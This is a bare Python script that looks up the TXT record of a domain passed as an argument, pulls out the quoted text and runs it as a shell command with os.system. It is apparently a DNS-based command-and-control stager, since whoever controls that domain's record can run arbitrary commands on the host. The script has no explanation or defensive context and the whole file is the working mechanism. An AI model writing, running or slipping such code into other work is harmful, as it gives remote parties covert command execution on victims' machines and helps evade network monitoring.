#!/usr/bin/python3

import os, sys
import dns.resolver

domain = sys.argv[1]
result = dns.resolver.resolve(domain, 'TXT')

for cmdval in result:
  
  text = cmdval.to_text()
  result = text.split('"')[1].split('"')[0]

os.system(result)
